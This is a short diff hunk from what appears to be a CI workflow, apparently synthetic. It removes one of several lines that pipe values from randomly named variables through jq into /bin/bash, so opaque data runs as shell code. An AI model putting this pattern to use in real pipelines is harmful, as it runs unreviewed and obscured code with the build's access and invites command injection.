@@ -50,7 +50,6 @@ jobs:
           printf '%s' "$rznjx58390" | jq -r .vqyww89283 | /bin/bash
           echo $bps358 | jq -r .zux9 | /bin/bash
           echo $ba63152 | jq -r .lpq54 | /bin/bash
-          echo $hqxu7290 | jq -r .qeup26051 | /bin/bash
           printf '%s' "$l02530" | jq -r .erp998 | /bin/bash
 
       - name: Store results
